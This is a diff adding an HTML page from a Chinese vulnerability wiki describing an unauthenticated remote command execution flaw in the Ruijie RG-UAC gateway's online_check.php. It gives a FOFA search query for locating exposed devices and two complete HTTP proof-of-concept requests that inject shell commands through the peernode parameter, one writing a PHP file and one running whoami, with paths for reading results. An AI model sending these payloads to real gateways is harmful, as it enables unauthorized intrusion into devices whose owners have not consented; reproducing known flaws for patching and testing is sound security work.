@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7RG-UAC%E5%BA%94%E7%94%A8%E7%BD%91%E5%85%B3/%E9%94%90%E6%8D%B7RG-UAC%E5%BA%94%E7%94%A8%E7%BD%91%E5%85%B3online_check.php%E5%89%8D%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>锐捷RG-UAC应用网关online_check.php前台RCE漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u9510\u6377RG-UAC\u5e94\u7528\u7f51\u5173online_check.php\u524d\u53f0RCE\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2" },
+              {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3" },
+              {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E9%94%90%E6%8D%B7RG-UAC%E5%BA%94%E7%94%A8%E7%BD%91%E5%85%B3static_convert.php%E5%89%8D%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E9%94%90%E6%8D%B7RG-UAC%E5%BA%94%E7%94%A8%E7%BD%91%E5%85%B3static_convert.php%E5%89%8D%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        锐捷RG-UAC应用网关static_convert.php前台RCE漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E9%94%90%E6%8D%B7RG-UAC%E5%BA%94%E7%94%A8%E7%BD%91%E5%85%B3nmc_sync.php%E5%89%8D%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E9%94%90%E6%8D%B7RG-UAC%E5%BA%94%E7%94%A8%E7%BD%91%E5%85%B3nmc_sync.php%E5%89%8D%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        锐捷RG-UAC应用网关nmc_sync.php前台RCE漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="rg-uaconline_checkphprce">锐捷RG-UAC应用网关online_check.php前台RCE漏洞<a class="headerlink" href="#rg-uaconline_checkphprce" title="Permanent link">&para;</a></h1>
+<h3 id="_1">一、漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<p><font style="color:rgba(0, 0, 0, 0.9);">锐捷RG-UAC应用管理网关 online_check.php 接口处存在命令执行漏洞，未经身份认证的攻击者可执行任意命令控制服务器权限。</font></p>
+<h3 id="_2">二、影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<p>锐捷RG-UAC应用网关</p>
+<h3 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>fofa：app="Ruijie-RG-UAC"</p>
+<p>特征：</p>
+<p><img alt="1708679452594-4ac22429-3b10-4a58-8ee3-d7d42244c115.png" src="./img/dW2Qo23Th4j1ct2P/1708679452594-4ac22429-3b10-4a58-8ee3-d7d42244c115-117320.png" /></p>
+<h3 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>访问该链接出现如下页面表示可能存在漏洞</p>
+<div class="highlight"><pre><span></span><code><span class="o">/</span><span class="n">view</span><span class="o">/</span><span class="n">vpn</span><span class="o">/</span><span class="n">autovpn</span><span class="o">/</span><span class="n">online_check</span><span class="p">.</span><span class="na">php</span>
+</code></pre></div>
+<p><img alt="1710431715996-8076fb25-cda8-46d5-98cc-ba2f96e1c4ad.png" src="./img/dW2Qo23Th4j1ct2P/1710431715996-8076fb25-cda8-46d5-98cc-ba2f96e1c4ad-365591.png" /></p>
+<div class="highlight"><pre><span></span><code><span class="nl">iii</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="n">hit</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span>
+</code></pre></div>
+<p>通过以下poc写入文件</p>
+<div class="highlight"><pre><span></span><code><span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">view</span><span class="o">/</span><span class="n">vpn</span><span class="o">/</span><span class="n">autovpn</span><span class="o">/</span><span class="n">online_check</span><span class="p">.</span><span class="na">php</span><span class="o">?</span><span class="n">peernode</span><span class="o">=%</span><span class="mi">20</span><span class="o">|%</span><span class="mi">20</span><span class="err">`</span><span class="n">echo</span><span class="o">%</span><span class="mi">20</span><span class="n">PD9waHAgZWNobyAxMTEqMTExOyB1bmxpbmsoX19GSUxFX18pOyA</span><span class="o">/</span><span class="n">Pg</span><span class="o">==%</span><span class="mi">20</span><span class="o">|%</span><span class="mi">20</span><span class="n">base64</span><span class="o">%</span><span class="mi">20</span><span class="o">-</span><span class="n">d</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">3</span><span class="n">E</span><span class="o">%</span><span class="mi">20</span><span class="n">test</span><span class="p">.</span><span class="na">php</span><span class="err">`</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nl">Host</span><span class="p">:</span><span class="w"> </span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="mf">122.0.0.0</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">apng</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">signed</span><span class="o">-</span><span class="n">exchange</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="n">b3</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span>
+<span class="n">Sec</span><span class="o">-</span><span class="n">Ch</span><span class="o">-</span><span class="n">Ua</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Chromium&quot;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&quot;122&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Not(A:Brand&quot;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&quot;24&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Google Chrome&quot;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&quot;122&quot;</span>
+<span class="n">Sec</span><span class="o">-</span><span class="n">Ch</span><span class="o">-</span><span class="n">Ua</span><span class="o">-</span><span class="n">Mobile</span><span class="p">:</span><span class="w"> </span><span class="o">?</span><span class="mi">0</span>
+<span class="n">Sec</span><span class="o">-</span><span class="n">Ch</span><span class="o">-</span><span class="n">Ua</span><span class="o">-</span><span class="n">Platform</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Windows&quot;</span>
+<span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Dest</span><span class="p">:</span><span class="w"> </span><span class="n">document</span>
+<span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Mode</span><span class="p">:</span><span class="w"> </span><span class="n">navigate</span>
+<span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Site</span><span class="p">:</span><span class="w"> </span><span class="n">none</span>
+<span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">User</span><span class="p">:</span><span class="w"> </span><span class="o">?</span><span class="mi">1</span>
+<span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+</code></pre></div>
+<p><img alt="1710431853374-b1498b38-c30c-43f0-8893-fa8e7893337f.png" src="./img/dW2Qo23Th4j1ct2P/1710431853374-b1498b38-c30c-43f0-8893-fa8e7893337f-478863.png" /></p>
+<p>文件写入位置</p>
+<div class="highlight"><pre><span></span><code><span class="o">/</span><span class="n">view</span><span class="o">/</span><span class="n">vpn</span><span class="o">/</span><span class="n">autovpn</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="na">php</span>
+</code></pre></div>
+<p><img alt="1710431872991-5400bcfa-93cf-4df9-9e50-f00e5c241555.png" src="./img/dW2Qo23Th4j1ct2P/1710431872991-5400bcfa-93cf-4df9-9e50-f00e5c241555-640890.png" />通过如下poc执行命令</p>
+<div class="highlight"><pre><span></span><code><span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">view</span><span class="o">/</span><span class="n">vpn</span><span class="o">/</span><span class="n">autovpn</span><span class="o">/</span><span class="n">online_check</span><span class="p">.</span><span class="na">php</span><span class="o">?</span><span class="n">peernode</span><span class="o">=%</span><span class="mi">20</span><span class="o">|%</span><span class="mi">20</span><span class="err">`</span><span class="n">whoami</span><span class="o">%</span><span class="mi">20</span><span class="o">&gt;%</span><span class="mf">201.</span><span class="n">txt</span><span class="err">`</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nl">Host</span><span class="p">:</span><span class="w"> </span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="mf">122.0.0.0</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">apng</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">signed</span><span class="o">-</span><span class="n">exchange</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="n">b3</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span>
+<span class="n">Sec</span><span class="o">-</span><span class="n">Ch</span><span class="o">-</span><span class="n">Ua</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Chromium&quot;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&quot;122&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Not(A:Brand&quot;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&quot;24&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Google Chrome&quot;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&quot;122&quot;</span>
+<span class="n">Sec</span><span class="o">-</span><span class="n">Ch</span><span class="o">-</span><span class="n">Ua</span><span class="o">-</span><span class="n">Mobile</span><span class="p">:</span><span class="w"> </span><span class="o">?</span><span class="mi">0</span>
+<span class="n">Sec</span><span class="o">-</span><span class="n">Ch</span><span class="o">-</span><span class="n">Ua</span><span class="o">-</span><span class="n">Platform</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Windows&quot;</span>
+<span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Dest</span><span class="p">:</span><span class="w"> </span><span class="n">document</span>
+<span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Mode</span><span class="p">:</span><span class="w"> </span><span class="n">navigate</span>
+<span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Site</span><span class="p">:</span><span class="w"> </span><span class="n">none</span>
+<span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">User</span><span class="p">:</span><span class="w"> </span><span class="o">?</span><span class="mi">1</span>
+<span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+</code></pre></div>
+<p><img alt="1710431969941-59a7fcd6-882f-425d-85e2-d70c10e71bba.png" src="./img/dW2Qo23Th4j1ct2P/1710431969941-59a7fcd6-882f-425d-85e2-d70c10e71bba-586973.png" /></p>
+<p>获取命令执行结果</p>
+<div class="highlight"><pre><span></span><code><span class="o">/</span><span class="n">view</span><span class="o">/</span><span class="n">vpn</span><span class="o">/</span><span class="n">autovpn</span><span class="o">/</span><span class="mf">1.</span><span class="n">txt</span>
+</code></pre></div>
+<p><img alt="1710431991407-1d277e48-b876-4742-adcf-ca69ccb757d9.png" src="./img/dW2Qo23Th4j1ct2P/1710431991407-1d277e48-b876-4742-adcf-ca69ccb757d9-381585.png" /></p>
+<blockquote>
+<p>更新: 2024-06-24 11:42:29<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/ektr1dwcngu6c0ct">https://www.yuque.com/xiaokp7/ocvun2/ektr1dwcngu6c0ct</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E9%94%90%E6%8D%B7RG-UAC%E5%BA%94%E7%94%A8%E7%BD%91%E5%85%B3static_convert.php%E5%89%8D%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E9%94%90%E6%8D%B7RG-UAC%E5%BA%94%E7%94%A8%E7%BD%91%E5%85%B3static_convert.php%E5%89%8D%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        锐捷RG-UAC应用网关static_convert.php前台RCE漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E9%94%90%E6%8D%B7RG-UAC%E5%BA%94%E7%94%A8%E7%BD%91%E5%85%B3nmc_sync.php%E5%89%8D%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E9%94%90%E6%8D%B7RG-UAC%E5%BA%94%E7%94%A8%E7%BD%91%E5%85%B3nmc_sync.php%E5%89%8D%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        锐捷RG-UAC应用网关nmc_sync.php前台RCE漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
